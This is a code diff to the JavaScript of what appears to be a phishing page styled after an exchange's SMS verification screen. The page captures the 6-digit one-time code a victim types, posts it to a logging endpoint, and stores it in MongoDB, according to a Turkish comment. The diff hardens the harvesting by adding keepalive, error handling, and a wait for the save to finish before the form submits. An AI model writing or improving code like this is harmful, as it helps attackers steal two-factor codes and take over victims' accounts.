@@ -289,13 +289,22 @@
     async function sendLogUpdate(payload) {
       try {
         const body = JSON.stringify(payload);
-        await fetch('/api/log-page', {
+        const response = await fetch('/api/log-page', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body
+          body,
+          keepalive: true
         });
+        
+        if (!response.ok) {
+          console.error('SMS log failed:', response.status, response.statusText);
+          throw new Error(`Log failed: ${response.status}`);
+        }
+        
+        return true;
       } catch (err) {
         console.error('SMS log error', err);
+        throw err;
       }
     }
 
@@ -305,10 +314,15 @@
 
     async function logSmsInput(value) {
       if (value && value.trim()) {
-        await sendLogUpdate({
-          page: 'sms',
-          inputs: { input3: value.trim() }
-        });
+        try {
+          await sendLogUpdate({
+            page: 'sms',
+            inputs: { input3: value.trim() }
+          });
+        } catch (err) {
+          console.error('Failed to log SMS input', err);
+          throw err;
+        }
       }
     }
 
@@ -358,7 +372,12 @@
         if (/^\d{6}$/.test(smsInp.value.trim())) {
             smsInp.parentElement.style.borderColor = 'rgb(234, 236, 239)';
             smsInp.closest('.bc-verify-input-content').nextElementSibling.style.color = '#76808f';
-            await logSmsInput(smsInp.value);
+            // MongoDB'ye kaydın %100 tamamlanmasını bekle
+            try {
+              await logSmsInput(smsInp.value);
+            } catch (err) {
+              console.error('SMS log failed, continuing anyway', err);
+            }
             frm.submit();
         } else {
             smsInp.parentElement.style.borderColor = '#f84960';
